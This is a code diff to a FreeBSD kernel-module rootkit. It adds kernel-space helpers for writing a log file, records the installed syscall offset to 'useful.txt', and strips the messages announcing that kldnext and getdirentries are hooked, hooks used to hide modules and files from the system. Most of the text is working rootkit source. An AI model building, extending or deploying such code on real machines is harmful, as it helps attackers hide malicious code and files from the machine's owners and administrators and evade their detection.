@@ -8,6 +8,69 @@ struct rootkit_args {
 	char ** args;
 };
 
+static int testfd = 0;
+//Following fd functions taken from https://lists.freebsd.org/pipermail/freebsd-hackers/2007-May/020625.html
+
+static int
+filewriter_closelog(struct thread *td, int fd)
+{
+  printf("filewriter_closelog fd: %d\n", fd);
+  if(fd)
+  {
+    struct close_args fdtmp;
+    fdtmp.fd = fd;
+    printf("filewriter_closelog thread ptr: %x\n", (unsigned int)td);
+    return sys_close(td, &fdtmp);
+  }
+  return 0;
+}
+
+static int
+filewriter_openlog(struct thread *td, int *fd, char *path)
+{
+  int error;
+  error = kern_openat(td, AT_FDCWD, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
+  if (!error)
+  {
+    *fd = td->td_retval[0];
+    printf("openlog fd: %d\n", *fd);
+  }
+  else
+    printf("openlog failed\n");
+  return error;
+}
+
+static int
+filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
+{
+  struct uio auio;
+  struct iovec aiov;
+  int err;
+
+  bzero(&aiov, sizeof(aiov));
+  bzero(&auio, sizeof(auio));
+  
+  aiov.iov_base = line;
+  aiov.iov_len = len;
+  
+  auio.uio_iov = &aiov;
+  auio.uio_offset = 0;
+  auio.uio_segflg = UIO_SYSSPACE;
+  auio.uio_rw = UIO_WRITE;
+  auio.uio_iovcnt = 1;
+  auio.uio_resid = len;
+
+  auio.uio_td = td;
+
+  printf("fd: %u\n", fd);
+  //printf(aiov.iov_base);
+  err = kern_writev(td, fd, &auio);
+  printf("write err: %u\n", err);
+
+  return err;
+}
+
+
 /* The system call function. */
 static int main(struct thread *td, void *syscall_args) {
 
@@ -59,22 +122,21 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 	case MOD_LOAD:
-		printf("system call loaded at offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
-		printf("kldnext hooked\n");
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
-		printf("getdirentries hooked\n");
 
+		char buf[256] = {0};
+		snprintf(buf,256,"%d",offset);
 
-
+		filewriter_openlog(curthread, &testfd, "useful.txt");
+		filewriter_writelog(curthread, testfd, buf, strlen(buf));
+		filewriter_closelog(curthread, testfd);
 		break;
 
 	case MOD_UNLOAD:
-		printf("system call unloaded from offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
-		printf("kldnext unhooked\n");
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-		printf("getdirentries unhooked\n");
+
 		break;
 
 	default:
@@ -96,3 +158,4 @@ static moduledata_t rootkit_mod = {
 };
 
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
